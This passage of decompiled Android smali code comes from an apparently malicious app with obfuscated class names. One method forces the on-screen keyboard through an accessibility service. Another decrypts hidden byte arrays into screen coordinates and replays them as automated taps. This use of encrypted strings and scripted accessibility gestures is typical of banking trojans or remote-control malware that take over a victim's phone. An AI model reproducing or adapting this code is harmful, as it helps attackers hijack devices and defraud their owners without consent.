    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_0

    :cond_2
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getSoftKeyboardController()Landroid/accessibilityservice/AccessibilityService$SoftKeyboardController;

    move-result-object p0

    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService$SoftKeyboardController;->setShowMode(I)Z

    :try_start_1
    invoke-virtual {v1, v0, v2}, Landroid/view/inputmethod/InputMethodManager;->toggleSoftInput(II)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :goto_0
    return-void

    :array_0
    .array-data 1
        0x40t
        0x71t
        -0x70t
        0x4ft
        -0x8t
        -0x25t
        -0x6ct
        -0x2at
        0x5dt
        0x77t
        -0x71t
        0x5et
    .end array-data

    :array_1
    .array-data 1
        0x29t
        0x1ft
        -0x20t
        0x3at
        -0x74t
        -0x7ct
        -0x7t
        -0x4dt
    .end array-data
.end method

.method public static Q()V
    .locals 11

    .line 1
    const-string v0, ""

    const/16 v1, 0x5c0

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/4 v3, 0x1

    new-array v4, v3, [B

    const/16 v5, -0x46

    const/4 v6, 0x0

    aput-byte v5, v4, v6

    new-array v5, v2, [B

    fill-array-data v5, :array_2

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/util/regex/Pattern;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    array-length v4, v1

    new-array v4, v4, [Landroid/graphics/Point;

    move v5, v6

    :goto_0
    array-length v7, v1

    sub-int/2addr v7, v3

    if-ge v5, v7, :cond_0

    :try_start_0
    aget-object v7, v1, v5

    new-array v8, v3, [B

    const/16 v9, -0xd

    aput-byte v9, v8, v6

    new-array v9, v2, [B

    fill-array-data v9, :array_3

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v7

    new-array v8, v3, [B

    const/16 v9, -0x42

    aput-byte v9, v8, v6

    new-array v9, v2, [B

    fill-array-data v9, :array_4

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v7

    new-array v8, v3, [B

    const/16 v9, -0x40

    aput-byte v9, v8, v6

    new-array v9, v2, [B

    fill-array-data v9, :array_5

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    aget-object v8, v7, v6

    new-array v9, v3, [B

    const/16 v10, 0x1a

    aput-byte v10, v9, v6

    new-array v10, v2, [B

    fill-array-data v10, :array_6

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    aget-object v8, v8, v3

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    aget-object v7, v7, v3

    new-array v9, v3, [B

    const/16 v10, -0x58

    aput-byte v10, v9, v6

    new-array v10, v2, [B

    fill-array-data v10, :array_7

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    aget-object v7, v7, v3

    invoke-static {v7}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v7

    new-instance v9, Landroid/graphics/Point;

    invoke-direct {v9, v8, v7}, Landroid/graphics/Point;-><init>(II)V

    aput-object v9, v4, v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    :cond_0
    const/16 v0, 0x1f4

    invoke-static {v4, v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->I([Landroid/graphics/Point;I)V

    return-void

    :array_0
    .array-data 1
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x14t
        -0x3bt
        -0x15t
        -0xft
        0x75t
        -0x2et
        -0x20t
        -0x31t
        0x1bt
        -0x3dt
        -0x16t
        -0xdt
        0x24t
        -0x4ft
        -0x5at
        -0x5bt
        0x15t
        -0x39t
        -0x11t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x57t
        -0x5bt
        0x1ft
        -0x39t
        -0x5bt
        -0x1t
        0x73t
        -0x50t
        -0x5at
        -0x5et
        0x14t
        -0x40t
        -0xct
        -0x64t
        0x35t
        -0x26t
        -0x57t
        -0x5ft
        0x1et
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x3at
        -0x26t
        -0x51t
        -0x5bt
        0x5bt
        -0x34t
        -0x5dt
        -0x63t
        0x35t
        -0x23t
        -0x57t
        -0x5ft
        0xat
        -0x51t
        -0x1bt
        -0x9t
        0x3at
        -0x27t
        -0x5dt
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x16t
        -0xct
        0x31t
        -0x26t
        -0x1at
        -0x53t
        0x5dt
        -0x52t
        -0x1bt
        -0x10t
        0x3at
        -0x22t
        -0x49t
        -0x32t
        0x1bt
        -0x3ct
        -0x17t
        -0xdt
        0x31t
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x14t
        -0x39t
        -0x14t
        -0xat
        0x75t
        -0x2et
        -0x20t
        -0x31t
        0x1bt
        -0x3dt
        -0x16t
        -0xdt
        0x24t
        -0x4ft
        -0x5at
        -0x5bt
        0x17t
        -0x3ct
        -0x12t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x57t
        -0x5at
        0x16t
        -0x40t
        -0x5bt
        -0x1t
        0x73t
        -0x50t
        -0x5at
        -0x5et
        0x14t
        -0x40t
        -0xct
        -0x64t
        0x35t
        -0x26t
        -0x55t
        -0x52t
        0x16t
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x3at
        -0x28t
        -0x54t
        -0x59t
        0x5bt
        -0x34t
        -0x5dt
        -0x63t
        0x35t
        -0x23t
        -0x57t
        -0x5ft
        0xat
        -0x51t
        -0x1bt
        -0x9t
        0x38t
        -0x23t
        -0x55t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x16t
        -0xbt
        0x3bt
        -0x24t
        -0x1at
        -0x53t
        0x5dt
        -0x52t
        -0x1bt
        -0x10t
        0x3at
        -0x22t
        -0x49t
        -0x32t
        0x1bt
        -0x3ct
        -0x18t
        -0xct
        0x3ct
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x17t
        -0x31t
        -0x1ft
        -0xft
        0x75t
        -0x2et
        -0x20t
        -0x31t
        0x1bt
        -0x3dt
        -0x16t
        -0xdt
        0x24t
        -0x4ft
        -0x5at
        -0x5at
        0x1ft
        -0x3ft
        -0x11t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x56t
        -0x52t
        0x13t
        -0x32t
        -0x5bt
        -0x1t
        0x73t
        -0x50t
        -0x5at
        -0x5et
        0x14t
        -0x40t
        -0xct
        -0x64t
        0x35t
        -0x27t
        -0x5et
        -0x5dt
        0x17t
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x39t
        -0x2ft
        -0x57t
        -0x5at
        0x5bt
        -0x34t
        -0x5dt
        -0x63t
        0x35t
        -0x23t
        -0x57t
        -0x5ft
        0xat
        -0x51t
        -0x1bt
        -0xct
        0x31t
        -0x28t
        -0x57t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x17t
        -0x3t
        0x30t
        -0x23t
        -0x1at
        -0x53t
        0x5dt
        -0x52t
        -0x1bt
        -0x10t
        0x3at
        -0x22t
        -0x49t
        -0x32t
        0x1bt
        -0x39t
        -0x20t
        -0xdt
        0x3dt
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x17t
        -0x32t
        -0x14t
        -0x9t
        0x75t
        -0x2et
        -0x20t
        -0x31t
        0x1bt
        -0x3dt
        -0x16t
        -0xdt
        0x24t
        -0x4ft
        -0x5at
        -0x5at
        0x1et
        -0x39t
        -0x12t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x56t
        -0x60t
        0x1ft
        -0x3bt
        -0x5bt
        -0x1t
        0x73t
        -0x50t
        -0x5at
        -0x5et
        0x14t
        -0x40t
        -0xct
        -0x64t
        0x35t
        -0x27t
        -0x54t
        -0x5ft
        0x16t
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x39t
        -0x21t
        -0x58t
        -0x5ft
        0x5bt
        -0x34t
        -0x5dt
        -0x63t
        0x35t
        -0x23t
        -0x57t
        -0x5ft
        0xat
        -0x51t
        -0x1bt
        -0xct
        0x3ft
        -0x28t
        -0x58t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x17t
        -0xdt
        0x30t
        -0x28t
        -0x1at
        -0x53t
        0x5dt
        -0x52t
        -0x1bt
        -0x10t
        0x3at
        -0x22t
        -0x49t
        -0x32t
        0x1bt
        -0x39t
        -0x12t
        -0xdt
        0x39t
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x17t
        -0x40t
        -0x14t
        -0xft
        0x75t
        -0x2et
        -0x20t
        -0x31t
        0x1bt
        -0x3dt
        -0x16t
        -0xdt
        0x24t
        -0x4ft
        -0x5at
        -0x5at
        0x10t
        -0x3bt
        -0x17t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x56t
        -0x5ft
        0x17t
        -0x39t
        -0x5bt
        -0x1t
        0x73t
        -0x50t
        -0x5at
        -0x5et
        0x14t
        -0x40t
        -0xct
        -0x64t
        0x35t
        -0x27t
        -0x52t
        -0x52t
        0x1et
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x39t
        -0x23t
        -0x5dt
        -0x5at
        0x5bt
        -0x34t
        -0x5dt
        -0x63t
        0x35t
        -0x23t
        -0x57t
        -0x5ft
        0xat
        -0x51t
        -0x1bt
        -0xct
        0x3dt
        -0x22t
        -0x5dt
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x17t
        -0x10t
        0x3dt
        -0x23t
        -0x1at
        -0x53t
        0x5dt
        -0x52t
        -0x1bt
        -0x10t
        0x3at
        -0x22t
        -0x49t
        -0x32t
        0x1bt
        -0x39t
        -0x13t
        -0xft
        0x3dt
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x17t
        -0x3dt
        -0x16t
        -0x10t
        0x75t
        -0x2et
        -0x20t
        -0x31t
        0x1bt
        -0x3dt
        -0x16t
        -0xdt
        0x24t
        -0x4ft
        -0x5at
        -0x5at
        0x13t
        -0x3at
        -0x13t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x56t
        -0x5dt
        0x1et
        -0x31t
        -0x5bt
        -0x1t
        0x73t
        -0x50t
        -0x5at
        -0x5et
        0x14t
        -0x40t
        -0xct
        -0x64t
        0x35t
        -0x27t
        -0x51t
        -0x5ft
        0x1ft
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x39t
        -0x24t
        -0x51t
        -0x52t
        0x5bt
        -0x34t
        -0x5dt
        -0x63t
        0x35t
        -0x23t
        -0x57t
        -0x5ft
        0xat
        -0x51t
        -0x1bt
        -0xct
        0x3ct
        -0x26t
        -0x53t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x17t
        -0xft
        0x38t
        -0x28t
        -0x1at
        -0x53t
        0x5dt
        -0x52t
        -0x1bt
        -0x10t
        0x3at
        -0x22t
        -0x49t
        -0x32t
        0x1bt
        -0x39t
        -0x15t
        -0xet
        0x3ft
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x17t
        -0x3bt
        -0x13t
        -0xet
        0x75t
        -0x2et
        -0x20t
        -0x31t
        0x1bt
        -0x3dt
        -0x16t
        -0xdt
        0x24t
        -0x4ft
        -0x5at
        -0x5at
        0x15t
        -0x3et
        -0x18t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x56t
        -0x5ct
        0x14t
        -0x3at
        -0x5bt
        -0x1t
        0x73t
        -0x50t
        -0x5at
        -0x5et
        0x14t
        -0x40t
        -0xct
        -0x64t
        0x35t
        -0x27t
        -0x58t
        -0x59t
        0x17t
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x39t
        -0x26t
        -0x5dt
        -0x5dt
        0x5bt
        -0x34t
        -0x5dt
        -0x63t
        0x35t
        -0x23t
        -0x57t
        -0x5ft
        0xat
        -0x51t
        -0x1bt
        -0xct
        0x3at
        -0x22t
        -0x51t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x17t
        -0x9t
        0x3ct
        -0x30t
        -0x1at
        -0x53t
        0x5dt
        -0x52t
        -0x1bt
        -0x10t
        0x3at
        -0x22t
        -0x49t
        -0x32t
        0x1bt
        -0x39t
        -0x16t
        -0x9t
        0x30t
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x17t
        -0x3ct
        -0x18t
        -0x3t
        0x75t
        -0x2et
        -0x20t
        -0x31t
        0x1bt
        -0x3dt
        -0x16t
        -0xdt
        0x24t
        -0x4ft
        -0x5at
        -0x5at
        0x17t
        -0x31t
        -0x16t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x56t
        -0x5at
        0x11t
        -0x3ct
        -0x5bt
        -0x1t
        0x73t
        -0x50t
        -0x5at
        -0x5et
        0x14t
        -0x40t
        -0xct
        -0x64t
        0x35t
        -0x27t
        -0x56t
        -0x5et
        0x14t
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x39t
        -0x27t
        -0x58t
        -0x5ft
        0x5bt
        -0x34t
        -0x5dt
        -0x63t
        0x35t
        -0x23t
        -0x57t
        -0x5ft
        0xat
        -0x51t
        -0x1bt
        -0xct
        0x39t
        -0x27t
        -0x53t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x17t
        -0xbt
        0x31t
        -0x2ft
        -0x1at
        -0x53t
        0x5dt
        -0x52t
        -0x1bt
        -0x10t
        0x3at
        -0x22t
        -0x49t
        -0x32t
        0x1bt
        -0x39t
        -0x18t
        -0x3t
        0x38t
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x17t
        -0x3at
        -0x12t
        -0xdt
        0x75t
        -0x2et
        -0x20t
        -0x31t
        0x1bt
        -0x3dt
        -0x16t
        -0xdt
        0x24t
        -0x4ft
        -0x5at
        -0x5at
        0x16t
        -0x3dt
        -0x15t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x56t
        -0x59t
        0x13t
        -0x3at
        -0x5bt
        -0x1t
        0x73t
        -0x50t
        -0x5at
        -0x5et
        0x14t
        -0x40t
        -0xct
        -0x64t
        0x35t
        -0x27t
        -0x55t
        -0x5ct
        0x11t
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x39t
        -0x28t
        -0x58t
        -0x59t
        0x5bt
        -0x34t
        -0x5dt
        -0x63t
        0x35t
        -0x23t
        -0x57t
        -0x5ft
        0xat
        -0x51t
        -0x1bt
        -0xct
        0x38t
        -0x26t
        -0x58t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x17t
        -0xbt
        0x39t
        -0x21t
        -0x1at
        -0x53t
        0x5dt
        -0x52t
        -0x1bt
        -0x10t
        0x3at
        -0x22t
        -0x49t
        -0x32t
        0x1bt
        -0x39t
        -0x18t
        -0xbt
        0x3ct
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x1ft
        -0x31t
        -0x14t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x5et
        -0x51t
        0x16t
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x31t
        -0x22t
        -0x54t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x1ft
        -0x10t
        0x3ct
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x1ft
        -0x3et
        -0x14t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x5et
        -0x5ct
        0x1et
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x31t
        -0x25t
        -0x56t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x1ft
        -0x9t
        0x3ct
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x1ft
        -0x39t
        -0x20t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x5et
        -0x59t
        0x13t
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x30t
        -0x2ft
        -0x52t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x20t
        -0x3t
        0x39t
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x1et
        -0x40t
        -0x20t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x5dt
        -0x5ft
        0x14t
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x30t
        -0x23t
        -0x57t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x20t
        -0xft
        0x3dt
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x1et
        -0x3bt
        -0x16t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x5dt
        -0x5bt
        0x13t
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x30t
        -0x27t
        -0x57t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x20t
        -0xbt
        0x3et
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x11t
        -0x31t
        -0x12t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x54t
        -0x51t
        0x1ft
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x3ft
        -0x30t
        -0x57t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x11t
        -0xdt
        0x31t
        -0x6bt
        -0x5ft
        -0x14t
        0x7et
        -0x35t
        -0x13t
        -0x9t
        0x3et
        -0x3ct
        -0x3et
        -0x56t
        0x11t
        -0x3dt
        -0x12t
        -0x48t
        0x32t
        -0x6dt
        -0x3dt
        -0x56t
        0x13t
        -0x3ct
        -0x12t
        -0x17t
        0x51t
        -0x2bt
        -0x54t
        -0x5et
        0x15t
        -0x75t
        -0x1et
        -0x42t
        0x50t
        -0x2bt
        -0x52t
        -0x5bt
        0x10t
        -0x26t
        -0x7ft
        -0x8t
        0x3ft
        -0x24t
        -0x53t
        -0x16t
        0x1ct
        -0x73t
        -0x80t
        -0x8t
        0x3dt
        -0x26t
        -0x53t
        -0x45t
        0x7ft
        -0x35t
        -0x11t
        -0xft
        0x3et
        -0x6bt
        -0x5ft
    .end array-data

    :array_1
    .array-data 1
        -0x69t
        0x26t
        -0xat
        -0x28t
        -0x3bt
        0x8t
        -0x18t
        -0x65t
    .end array-data

    :array_2
    .array-data 1
        -0x80t
        -0x59t
        -0x54t
        0x71t
        -0x72t
        -0x5at
        -0x4dt
        -0x1dt
    .end array-data

    :array_3
    .array-data 1
        -0x78t
        -0x4t
        0x66t
        -0x53t
        -0x42t
        -0x50t
        -0x30t
        -0x74t
    .end array-data

    :array_4
    .array-data 1
        -0x3dt
        0x32t
        -0x23t
        -0x4ct
        0x1t
        -0x53t
        -0x11t
        0x2t
    .end array-data

    :array_5
    .array-data 1
        -0x14t
        -0x3at
        -0x49t
        -0x17t
        0x1at
        -0x3ft
        0x18t
        -0x6at
    .end array-data

    :array_6
    .array-data 1
        0x27t
        0x4et
        0x40t
        0x36t
        -0x42t
        -0x21t
        -0x73t
        0x11t
    .end array-data

    :array_7
    .array-data 1
        -0x6bt
        0x52t
        -0x59t
        -0x70t
        -0x63t
        0x24t
        0x3t
        0x7t
    .end array-data
.end method

.method public static a(Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->i:Ljava/util/Map;

    invoke-interface {v0, p0}, Ljava/util/Map;->containsKey(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->i:Ljava/util/Map;

    invoke-interface {v0, p0, p1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_0
    return-void
.end method

.method public static b(Ljava/lang/String;)V
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->g:Ljava/util/List;

    invoke-interface {v0, p0}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->g:Ljava/util/List;

    invoke-interface {v0, p0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_0
    return-void
.end method

.method public static c(Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->h:Ljava/util/Map;

    invoke-interface {v0, p0}, Ljava/util/Map;->containsKey(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->h:Ljava/util/Map;

    invoke-interface {v0, p0, p1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_0
    return-void
.end method

.method public static d(Ljava/lang/Boolean;)V
    .locals 2

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_1

    return-void

    :cond_1
    :try_start_0
